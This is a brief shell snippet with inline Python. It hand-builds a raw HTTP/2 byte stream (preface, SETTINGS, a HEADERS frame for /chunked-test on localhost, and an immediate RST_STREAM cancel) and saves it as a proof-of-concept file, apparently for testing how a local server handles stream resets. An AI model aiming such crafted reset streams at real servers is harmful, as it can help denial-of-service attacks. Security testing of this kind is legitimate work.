# build variants with host header literal, authority www, path /chunked-test
python3 - <<'PY'
from pathlib import Path
def frame(t, flags, sid, payload=b''):
    return len(payload).to_bytes(3,'big')+bytes([t,flags])+(sid&0x7fffffff).to_bytes(4,'big')+payload
p=bytearray(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')+frame(4,0,0,b'')
# HPACK: :method GET(2), :scheme http(6), :path literal without indexing indexed-name 4 value /chunked-test, :authority literal indexed-name 1 value localhost
# literal without indexing indexed name: 0000xxxx, for index <15 byte=index. string no huffman: len byte.
headers=bytearray([0x82,0x86])
headers += bytes([0x04, len(b'/chunked-test')]) + b'/chunked-test'
headers += bytes([0x01, len(b'localhost')]) + b'localhost'
p+=frame(1,0x05,1,headers)
p+=frame(3,0,1,(8).to_bytes(4,'big'))
Path('/workspace/poc_rst_chunked').write_bytes(p)
print(len(p), p.hex())
PY
